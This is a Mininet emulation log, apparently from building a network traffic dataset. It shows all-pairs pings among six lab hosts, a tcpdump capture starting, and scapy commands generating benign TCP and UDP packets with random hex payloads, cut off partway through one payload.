+2025-07-13 20:55:43,874 - mininet - Level 25 - 
+
+2025-07-13 20:55:43,874 - mininet - Level 25 - h2 -> 
+2025-07-13 20:55:43,874 - mininet - DEBUG - *** h2 : ('LANG=C ping -c1  10.0.0.1',)
+
+2025-07-13 20:55:43,875 - mininet - DEBUG - PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
+
+2025-07-13 20:55:43,875 - mininet - DEBUG - 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.236 ms
+
+--- 10.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.236/0.236/0.236/0.000 ms
+
+2025-07-13 20:55:43,876 - mininet - DEBUG - 
+2025-07-13 20:55:43,876 - mininet - Level 25 - h1 
+2025-07-13 20:55:43,876 - mininet - DEBUG - *** h2 : ('LANG=C ping -c1  10.0.0.3',)
+
+2025-07-13 20:55:43,877 - mininet - DEBUG - PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.
+
+2025-07-13 20:55:43,879 - mininet - DEBUG - 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=2.51 ms
+
+--- 10.0.0.3 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.512/2.512/2.512/0.000 ms
+
+2025-07-13 20:55:43,880 - mininet - DEBUG - 
+2025-07-13 20:55:43,880 - mininet - Level 25 - h3 
+2025-07-13 20:55:43,880 - mininet - DEBUG - *** h2 : ('LANG=C ping -c1  10.0.0.4',)
+
+2025-07-13 20:55:43,881 - mininet - DEBUG - PING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.
+
+2025-07-13 20:55:43,883 - mininet - DEBUG - 64 bytes from 10.0.0.4: icmp_seq=1 ttl=64 time=2.25 ms
+
+--- 10.0.0.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.258/2.258/2.258/0.000 ms
+
+2025-07-13 20:55:43,883 - mininet - DEBUG - 
+2025-07-13 20:55:43,883 - mininet - Level 25 - h4 
+2025-07-13 20:55:43,883 - mininet - DEBUG - *** h2 : ('LANG=C ping -c1  10.0.0.5',)
+
+2025-07-13 20:55:43,884 - mininet - DEBUG - PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
+
+2025-07-13 20:55:43,887 - mininet - DEBUG - 64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=2.10 ms
+
+--- 10.0.0.5 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.105/2.105/2.105/0.000 ms
+
+2025-07-13 20:55:43,887 - mininet - DEBUG - 
+2025-07-13 20:55:43,887 - mininet - Level 25 - h5 
+2025-07-13 20:55:43,887 - mininet - DEBUG - *** h2 : ('LANG=C ping -c1  10.0.0.6',)
+
+2025-07-13 20:55:43,888 - mininet - DEBUG - PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
+
+2025-07-13 20:55:43,890 - mininet - DEBUG - 64 bytes from 10.0.0.6: icmp_seq=1 ttl=64 time=2.17 ms
+
+--- 10.0.0.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.173/2.173/2.173/0.000 ms
+
+2025-07-13 20:55:43,890 - mininet - DEBUG - 
+2025-07-13 20:55:43,890 - mininet - Level 25 - h6 
+2025-07-13 20:55:43,890 - mininet - Level 25 - 
+
+2025-07-13 20:55:43,890 - mininet - Level 25 - h3 -> 
+2025-07-13 20:55:43,890 - mininet - DEBUG - *** h3 : ('LANG=C ping -c1  10.0.0.1',)
+
+2025-07-13 20:55:43,892 - mininet - DEBUG - PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
+
+2025-07-13 20:55:43,892 - mininet - DEBUG - 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.108 ms
+
+--- 10.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.108/0.108/0.108/0.000 ms
+
+2025-07-13 20:55:43,892 - mininet - DEBUG - 
+2025-07-13 20:55:43,892 - mininet - Level 25 - h1 
+2025-07-13 20:55:43,892 - mininet - DEBUG - *** h3 : ('LANG=C ping -c1  10.0.0.2',)
+
+2025-07-13 20:55:43,893 - mininet - DEBUG - PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
+64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.023 ms
+
+--- 10.0.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.023/0.023/0.023/0.000 ms
+
+2025-07-13 20:55:43,893 - mininet - DEBUG - 
+2025-07-13 20:55:43,893 - mininet - Level 25 - h2 
+2025-07-13 20:55:43,893 - mininet - DEBUG - *** h3 : ('LANG=C ping -c1  10.0.0.4',)
+
+2025-07-13 20:55:43,894 - mininet - DEBUG - PING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.
+
+2025-07-13 20:55:43,896 - mininet - DEBUG - 64 bytes from 10.0.0.4: icmp_seq=1 ttl=64 time=2.06 ms
+
+--- 10.0.0.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.068/2.068/2.068/0.000 ms
+
+2025-07-13 20:55:43,897 - mininet - DEBUG - 
+2025-07-13 20:55:43,897 - mininet - Level 25 - h4 
+2025-07-13 20:55:43,897 - mininet - DEBUG - *** h3 : ('LANG=C ping -c1  10.0.0.5',)
+
+2025-07-13 20:55:43,898 - mininet - DEBUG - PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
+
+2025-07-13 20:55:43,900 - mininet - DEBUG - 64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=2.20 ms
+
+--- 10.0.0.5 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.203/2.203/2.203/0.000 ms
+
+2025-07-13 20:55:43,900 - mininet - DEBUG - 
+2025-07-13 20:55:43,900 - mininet - Level 25 - h5 
+2025-07-13 20:55:43,900 - mininet - DEBUG - *** h3 : ('LANG=C ping -c1  10.0.0.6',)
+
+2025-07-13 20:55:43,901 - mininet - DEBUG - PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
+
+2025-07-13 20:55:43,903 - mininet - DEBUG - 64 bytes from 10.0.0.6: icmp_seq=1 ttl=64 time=2.01 ms
+
+--- 10.0.0.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.013/2.013/2.013/0.000 ms
+
+2025-07-13 20:55:43,904 - mininet - DEBUG - 
+2025-07-13 20:55:43,904 - mininet - Level 25 - h6 
+2025-07-13 20:55:43,904 - mininet - Level 25 - 
+
+2025-07-13 20:55:43,904 - mininet - Level 25 - h4 -> 
+2025-07-13 20:55:43,904 - mininet - DEBUG - *** h4 : ('LANG=C ping -c1  10.0.0.1',)
+
+2025-07-13 20:55:43,905 - mininet - DEBUG - PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
+
+2025-07-13 20:55:43,905 - mininet - DEBUG - 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.103 ms
+
+--- 10.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.103/0.103/0.103/0.000 ms
+
+2025-07-13 20:55:43,905 - mininet - DEBUG - 
+2025-07-13 20:55:43,905 - mininet - Level 25 - h1 
+2025-07-13 20:55:43,906 - mininet - DEBUG - *** h4 : ('LANG=C ping -c1  10.0.0.2',)
+
+2025-07-13 20:55:43,907 - mininet - DEBUG - PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
+
+2025-07-13 20:55:43,907 - mininet - DEBUG - 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.038 ms
+
+--- 10.0.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
+
+2025-07-13 20:55:43,907 - mininet - DEBUG - 
+2025-07-13 20:55:43,907 - mininet - Level 25 - h2 
+2025-07-13 20:55:43,907 - mininet - DEBUG - *** h4 : ('LANG=C ping -c1  10.0.0.3',)
+
+2025-07-13 20:55:43,908 - mininet - DEBUG - PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.
+
+2025-07-13 20:55:43,908 - mininet - DEBUG - 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.021 ms
+
+--- 10.0.0.3 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
+
+2025-07-13 20:55:43,908 - mininet - DEBUG - 
+2025-07-13 20:55:43,908 - mininet - Level 25 - h3 
+2025-07-13 20:55:43,908 - mininet - DEBUG - *** h4 : ('LANG=C ping -c1  10.0.0.5',)
+
+2025-07-13 20:55:43,909 - mininet - DEBUG - PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
+
+2025-07-13 20:55:43,911 - mininet - DEBUG - 64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=2.29 ms
+
+--- 10.0.0.5 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.296/2.296/2.296/0.000 ms
+
+2025-07-13 20:55:43,911 - mininet - DEBUG - 
+2025-07-13 20:55:43,912 - mininet - Level 25 - h5 
+2025-07-13 20:55:43,912 - mininet - DEBUG - *** h4 : ('LANG=C ping -c1  10.0.0.6',)
+
+2025-07-13 20:55:43,913 - mininet - DEBUG - PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
+
+2025-07-13 20:55:43,915 - mininet - DEBUG - 64 bytes from 10.0.0.6: icmp_seq=1 ttl=64 time=2.09 ms
+
+--- 10.0.0.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.099/2.099/2.099/0.000 ms
+2025-07-13 20:55:43,915 - mininet - DEBUG - 
+
+2025-07-13 20:55:43,915 - mininet - DEBUG - 
+2025-07-13 20:55:43,915 - mininet - Level 25 - h6 
+2025-07-13 20:55:43,915 - mininet - Level 25 - 
+
+2025-07-13 20:55:43,915 - mininet - Level 25 - h5 -> 
+2025-07-13 20:55:43,915 - mininet - DEBUG - *** h5 : ('LANG=C ping -c1  10.0.0.1',)
+
+2025-07-13 20:55:43,916 - mininet - DEBUG - PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
+
+2025-07-13 20:55:43,916 - mininet - DEBUG - 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.101 ms
+
+--- 10.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.101/0.101/0.101/0.000 ms
+
+2025-07-13 20:55:43,917 - mininet - DEBUG - 
+2025-07-13 20:55:43,917 - mininet - Level 25 - h1 
+2025-07-13 20:55:43,917 - mininet - DEBUG - *** h5 : ('LANG=C ping -c1  10.0.0.2',)
+
+2025-07-13 20:55:43,918 - mininet - DEBUG - PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
+
+2025-07-13 20:55:43,918 - mininet - DEBUG - 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.026 ms
+
+--- 10.0.0.2 ping statistics ---
+
+2025-07-13 20:55:43,918 - mininet - DEBUG - 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.026/0.026/0.026/0.000 ms
+
+2025-07-13 20:55:43,918 - mininet - DEBUG - 
+2025-07-13 20:55:43,918 - mininet - Level 25 - h2 
+2025-07-13 20:55:43,918 - mininet - DEBUG - *** h5 : ('LANG=C ping -c1  10.0.0.3',)
+
+2025-07-13 20:55:43,919 - mininet - DEBUG - PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.
+
+2025-07-13 20:55:43,919 - mininet - DEBUG - 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.021 ms
+
+--- 10.0.0.3 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
+
+2025-07-13 20:55:43,919 - mininet - DEBUG - 
+2025-07-13 20:55:43,919 - mininet - Level 25 - h3 
+2025-07-13 20:55:43,919 - mininet - DEBUG - *** h5 : ('LANG=C ping -c1  10.0.0.4',)
+
+2025-07-13 20:55:43,920 - mininet - DEBUG - PING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.
+
+2025-07-13 20:55:43,920 - mininet - DEBUG - 64 bytes from 10.0.0.4: icmp_seq=1 ttl=64 time=0.021 ms
+
+--- 10.0.0.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
+
+2025-07-13 20:55:43,920 - mininet - DEBUG - 
+2025-07-13 20:55:43,920 - mininet - Level 25 - h4 
+2025-07-13 20:55:43,920 - mininet - DEBUG - *** h5 : ('LANG=C ping -c1  10.0.0.6',)
+
+2025-07-13 20:55:43,921 - mininet - DEBUG - PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
+
+2025-07-13 20:55:43,924 - mininet - DEBUG - 64 bytes from 10.0.0.6: icmp_seq=1 ttl=64 time=2.19 ms
+
+--- 10.0.0.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.199/2.199/2.199/0.000 ms
+
+2025-07-13 20:55:43,924 - mininet - DEBUG - 
+2025-07-13 20:55:43,924 - mininet - Level 25 - h6 
+2025-07-13 20:55:43,924 - mininet - Level 25 - 
+
+2025-07-13 20:55:43,924 - mininet - Level 25 - h6 -> 
+2025-07-13 20:55:43,924 - mininet - DEBUG - *** h6 : ('LANG=C ping -c1  10.0.0.1',)
+
+2025-07-13 20:55:43,925 - mininet - DEBUG - PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
+
+2025-07-13 20:55:43,925 - mininet - DEBUG - 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.124 ms
+
+--- 10.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.124/0.124/0.124/0.000 ms
+
+2025-07-13 20:55:43,925 - mininet - DEBUG - 
+2025-07-13 20:55:43,925 - mininet - Level 25 - h1 
+2025-07-13 20:55:43,925 - mininet - DEBUG - *** h6 : ('LANG=C ping -c1  10.0.0.2',)
+
+2025-07-13 20:55:43,927 - mininet - DEBUG - PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
+
+2025-07-13 20:55:43,927 - mininet - DEBUG - 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.039 ms
+
+--- 10.0.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
+
+2025-07-13 20:55:43,927 - mininet - DEBUG - 
+2025-07-13 20:55:43,927 - mininet - Level 25 - h2 
+2025-07-13 20:55:43,927 - mininet - DEBUG - *** h6 : ('LANG=C ping -c1  10.0.0.3',)
+
+2025-07-13 20:55:43,928 - mininet - DEBUG - PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.
+
+2025-07-13 20:55:43,928 - mininet - DEBUG - 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.022 ms
+
+--- 10.0.0.3 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.022/0.022/0.022/0.000 ms
+
+2025-07-13 20:55:43,928 - mininet - DEBUG - 
+2025-07-13 20:55:43,928 - mininet - Level 25 - h3 
+2025-07-13 20:55:43,928 - mininet - DEBUG - *** h6 : ('LANG=C ping -c1  10.0.0.4',)
+
+2025-07-13 20:55:43,929 - mininet - DEBUG - PING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.
+
+2025-07-13 20:55:43,929 - mininet - DEBUG - 64 bytes from 10.0.0.4: icmp_seq=1 ttl=64 time=0.022 ms
+
+--- 10.0.0.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.022/0.022/0.022/0.000 ms
+
+2025-07-13 20:55:43,929 - mininet - DEBUG - 
+2025-07-13 20:55:43,929 - mininet - Level 25 - h4 
+2025-07-13 20:55:43,929 - mininet - DEBUG - *** h6 : ('LANG=C ping -c1  10.0.0.5',)
+
+2025-07-13 20:55:43,930 - mininet - DEBUG - PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
+
+2025-07-13 20:55:43,930 - mininet - DEBUG - 64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=0.021 ms
+
+--- 10.0.0.5 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
+
+2025-07-13 20:55:43,930 - mininet - DEBUG - 
+2025-07-13 20:55:43,930 - mininet - Level 25 - h5 
+2025-07-13 20:55:43,930 - mininet - Level 25 - 
+
+2025-07-13 20:55:43,931 - mininet - Level 25 - *** Results: 0% dropped (30/30 received)
+
+2025-07-13 20:55:48,940 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/normal.pcap
+2025-07-13 20:55:48,941 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 20:55:48,941 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/normal.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 20:55:48,947 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/normal.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46108
+2025-07-13 20:55:50,952 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46108
+2025-07-13 20:55:52,961 - BENIGN - [32mINFO[0m - Starting benign traffic for 50 seconds...
+2025-07-13 20:55:52,961 - mininet - DEBUG - *** h3 : ('ping -c 1 10.0.0.5 > /dev/null',)
+
+2025-07-13 20:55:52,963 - mininet - DEBUG - 
+2025-07-13 20:55:52,963 - mininet - DEBUG - *** h5 : ('ping -c 1 10.0.0.3 > /dev/null',)
+
+2025-07-13 20:55:52,964 - mininet - DEBUG - 
+2025-07-13 20:55:52,964 - BENIGN - DEBUG - Generated ICMP traffic 0 [len=84B]
+2025-07-13 20:55:52,964 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=20370, dport=12345, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:53,025 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:53,596 - mininet - DEBUG - 
+2025-07-13 20:55:53,596 - BENIGN - DEBUG - Generated TCP SYN from h3:20370 -> h5:12345 [len=54B]
+2025-07-13 20:55:53,610 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=12345, dport=20370, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:53,671 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:54,231 - mininet - DEBUG - 
+2025-07-13 20:55:54,231 - BENIGN - DEBUG - Generated TCP SYN-ACK from h5:12345 <- h3:20370 [len=54B]
+2025-07-13 20:55:54,243 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=20370, dport=12345, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:54,304 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:54,848 - mininet - DEBUG - 
+2025-07-13 20:55:54,848 - BENIGN - DEBUG - Generated TCP ACK from h3:20370 -> h5:12345 [len=54B]
+2025-07-13 20:55:54,862 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;tcp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=20370, dport=12345, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'d1ddfc4552b6d4b1b839bf902302583c8f166a4ddfb9d098ab15d2a922c4a6260ecc9446bc028949081bcc0e1ea141f0a584728ba2bdff2bab57b97566b97eb1c075f2e04e8bad8b539305512a023acff5f84f31e01c14d880eb1077e4371b4b144441c5ca947a3c6dd4da04214e156acd15ef1c29ed43c1221890a3a6f262e14971b3d996b418665c96bb4410a62c831bd7f2b98473036e793e492c23bdf47d7ff1c51da2da00dcef12f20b24b6c84b503e6e5530c0921b3a6c9fd49de406f216491a61ac7918208e0e2ca6650e609ed1a09feec4e82fee936728c6d815603df3127badf79c0e04c9d495fc222ca9ec56aa2d28c41370b04d96d22ac87ce875a17c45a063ff2789b31d981be56f9e5c6c8d8cc06b434a664f9e6fb7d7fc61ce5fa9d696857a2ca7931a713b3aed6268db0dcf2d49bf2508f8de3d918dcbb56b1499bbca94986578c4d5c6e71401e951a71cad6c10eeeccbe673f4acdac66f691fa27eeb3b6fae833e3e35ae50dfee8773938aebae8b0f98d8218198ff78a4c20df5eb0ed6a2d71003f35ad50488b62d48e52fdc1ca023edc2b15f2bfca5f743bcb8d9d2b148ae69697efc161198f21f265d801ea09933c0e525c6c4fce90167b47890598d34ad5500b01e5551dfe181b6a152787866a560cdbd0169517b58b1e4ade64e04928d125272215dc68c8e539a2ef695b85fc1e3661dad0ef5d92652e2dbef1043f68b2239aa0cf85d75c0630722defcd3513cf3babb4290a832d1eac64f761d4d539fb4cc53cccbd18c96493d034dbdf34a557bc01cec45c78a0667dac5e483dcd6b682a73ef6cb86fd7d14094f84e6c22be5ae6318ab958edceb309a8f8e242194f72dab033efb9d0c4a4b9735e52a77f3862ea1967cf09db0090b71f749169b567bfcc8b0b239ca129b2b50ddb0a10124769b02426d5d7c8ab78a90cd0306035058b084bff4136d52c071f52930346df62e5456089e10ef9244e27538aefc5d3a44dc05f91152517228c2afb05a4b7ff524bc145265a47dfe8adecba407c204d03700d99ebbb2c93f8b8d9c12da72d0dc28e9a6def13df0116ace5ed5bcef9703961d64c2fa8483bf92c9d33acf8104b64494fda66104716f929001c2d9b83ea2a69bce1e1ca694a8afe1b69360addc2f707cb9b9c99e2818856293a3919a6a562d2a97b53bdbd187315184915c428c17d359b9fb68c4df0c30770c151d1ccbfde0494c143a6545b4f1b791decbeb2e5a1794b615522cb125b9d26ad86e89d0e28b0e53a47886d7d88b2522bf22e7a01464dd0b1185f0bac9c45d479e82dccc5722a8c93700c8c46e9cbc07393e1fc3ead0f6a8cbf02718c539ec3714e95dbac04d3a65d53b18bcb7089a06940abc8b602683496af4702910ef263898ed1dd2f9d8a93f4b513fa479be4502efb84cc8a811951ab033484b723b5b6c52b9c1fcd99e1fe3dcf828e2e090da5a9ce0497bab47dfb2ab87e10a61091692751ca0551026b81d54f930b4126dfd9d492380f78adfa83082103c84b8668a316eb5e095fcd41473ff91a5ce435f2fad56a8642986da889527c0c9073c8c0bc39968de8b0380c175c82a93ecc48f892aa9fc36c0cc98158426060a0e635466cfdffdde90e5e3f06a338fd3f7e9456687bb7139d7a6dd95fc9d4dd03bc3ef92a1ddfd24fca1694d0aa010405db979532006557fddabf705f722b41e32ca73ee874c2b3215549cd0b14ab8b825d512ddd15241bf1bfb01b82b\')); sendp(tcp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:54,923 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:55,510 - mininet - DEBUG - 
+2025-07-13 20:55:55,510 - BENIGN - DEBUG - Generated TCP data traffic from h3:20370 -> h5:12345 [content='TCP data'] [Session 1] [len=1295B]
+2025-07-13 20:55:55,510 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=12345, dport=20370, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:55,570 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:56,150 - mininet - DEBUG - 
+2025-07-13 20:55:56,150 - BENIGN - DEBUG - Generated TCP ACK reply from h5:12345 <- h3:20370 [len=54B]
+2025-07-13 20:55:56,150 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;udp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/UDP(sport=3594, dport=12346)/Raw(load=bytes.fromhex(\'0abcb0c60200a8dd6a06b08ecaf8a19e59d2481c0510888a50632666abdc9d8524fc719dcb5db4c7a036c3b33e5188bea60b73c2a416594725dc0a7ddf32945c97e60350a035c8467a5f5cc22f78d921834deec862eb78c2d8ce8fd9797fb228e6be16d04c3340e53b592e3b66b7f6a3b36bce307cabf061505a08d65ed50bca24f17319cb9379de0f47521c579d63899432c61b6e15a651745f830983e57320e5257ddfb5ae7597605d08426b0505f5cd5a864bebc2bdeb09e4aee912759d01f03956d36bd2d8f6cdf3086f5bfc4c00d333c08deb6c7c6709e7e19266cb022ff918ab4791dcab5d109266b30297ccce18ad66a2fbc78c30bd737eaa44c53b4065b4f26b560d4876527dbf88181601477727201b0557a4ae935becf74a72a737e3837ddebe116af7d540a4ee8e29f61057d80ff301bd682f844cf8e8eadb48d8978c8431275190406afe3129b4475546bec9946aa5a8ce74fb061eab45db191d27c577bba7e09c6cea744437b505b843bb174b4a920fdd72d59399bfc1f9de67b323a66394ff85ed185bf45bd7e7f8d2a1b34c0f074f59d8f61ff86e0dd15f7dfd469bd2f812ec1a3ff0217559267eea64c438b8932304496feb01e1493ce20b8e4de57f94d77751f0f928028ab3f1e7b7359700ffd909d08a878ad5039c695e5265fcc1bc2bf415360afaa65e91d7ec03ad4c3f383907dce04fbc0b891fc9373061310be66f6bca82b1d423a33a9fbfa98cfca9e7a603fcbd1d57eb01f5825e65e72dcf58591178d1b70ba3d05d913d4038eb62c2f67e33a8de99b127a4a888f0bf516a532ba954f98caae0fc21b8432d3d30d4e2ec1d3334a53a46bb471d0507c4be351a55152cbb10d0594270bd804f87511ba342a1c189eee0d173c5ee410a62a319736f0a7d452fecb529be1670dc02678bc33fa6378656e51d06bfccfd13346c7d4663cda943b305555f0bec1134fd74422e6c6d5510007b36cc0bcb6cbcc3473ef8610e2ea1dfbbbaf188683d381b27d8dd965cad56d5891b10aa6c433fd3510290e4a58cb31cc35117506ccc617f36b876e9ee62d1cee70ad2a372685b5e81d46ffce817b9b70a33bb5a3931b1f9d7aa99b89a36b886abcb94cb5f8a6a3a78ceac407394f629e0832b9fede192936082bc8865c5e0a9ec9f71ede64c6c2ce4806ddd42f29abf91e90ddd939351d9ae9945e9b745915f246855399380babddf604aae7b15e21fe4de077360397f78a2c8759aa7d7424c07c8b64e544b9657e2f5ba59588bd9f4f1c59638712a2ffd25056141affb693d2f01d8266a41eb1568e6acba5bde233318196a427e76b2125357afdb7b989e47d56a7db6c4e939458facee19dcdae4b4e4bc30933493608976d5f036f58bec12e1d89afc67bab657da5fcd8a1b006d8f6d1e0805ed4099a54244899e5e45b593bc336db637bc982a465d56b9ece870abdd927c66c69be5e8e03842a475c6d8d8bccadcbddcd8f1fd7eb18beea41d556790b190fe8c95f3c05389732d6974c90a5c10c99d50b57091626b0b4792cd9933106465e50d5bd1aa7f8b5f32e49711f1e1276813d0f6191e155b5a64d450a59085b3cfa33db87044c9708df311665b4aa1850d6d28fe6dd6e5e